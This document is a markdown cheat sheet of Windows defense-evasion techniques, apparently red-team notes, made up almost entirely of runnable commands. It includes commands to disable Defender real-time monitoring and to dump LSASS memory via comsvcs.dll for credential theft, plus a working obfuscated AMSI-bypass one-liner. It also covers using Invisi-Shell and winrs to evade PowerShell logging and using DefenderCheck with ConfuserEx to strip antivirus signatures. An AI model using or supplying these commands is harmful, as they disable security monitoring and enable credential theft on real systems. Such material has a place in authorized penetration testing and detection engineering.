# Evasion
## General
#### Disable AV monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Check the language mode
```
$ExecutionContext.SessionState.LanguageMode
```

#### Check if applocker policy is running
```
Get-AppLockerPolicy -Effective
```

#### Enumerate applocker policy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Check applocker policy in registery
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

#### Check for WDAC
```
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

#### If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
```
runas /netonly /user:<DOMAIN\<USER> cmd.exe
winrs -r:<PC NAME> cmd
```

### LOLBAS
- Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/

#### For example dumping lsass:
```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
dir C:\Users\Public\lsass.dmp
```

#### Powershell detections
- System-wide transcription
- Script Block logging 
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

## AMSI Bypass
- https://amsi.fail/
- Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )} $sess
```

## Invisi-shell
- Bypasses Sytem-Wide transcript
- https://github.com/OmerYa/Invisi-Shell
- Type exit from the new PowerShell session to complete the clean-up.

#### With admin privileges
```
./RunWithPathAsAdmin.bat 
```

#### With non-admin privileges:
```
RunWithRegistryNonAdmin.bat
```

## Winrs
- Use Winrs instead of PSRemoting to evade System-wide-transcript and deep script block logging
```
winrs -remote:server1 -u:<COMPUTERNAME>\<USER> -p:<PASS> hostname
```

## Com objects
- https://github.com/bohops/WSMan-WinRM

## AV Bypass
- Defendercheck to check for signatures https://github.com/matterpreter/DefenderCheck
- Run Defendercheck ```DefenderCheck.exe <PATH TO BINARY>```
- Replace string which gets detected.
- Recompile and check again!

- Obfuscate binary with https://github.com/mkaring/ConfuserEx
- Launch ConfuserEx
- In Project tab select the Base Directory where the binary file is located.
- In Project tab Select the Binary File that we want to obfuscate.
- In Settings tab add the rules.
- In Settings tab edit the rule and select the preset as `Normal`.
- In Protect tab click on the protect button.
- We will find the new obfuscated binary in the Confused folder under the Base Directory.
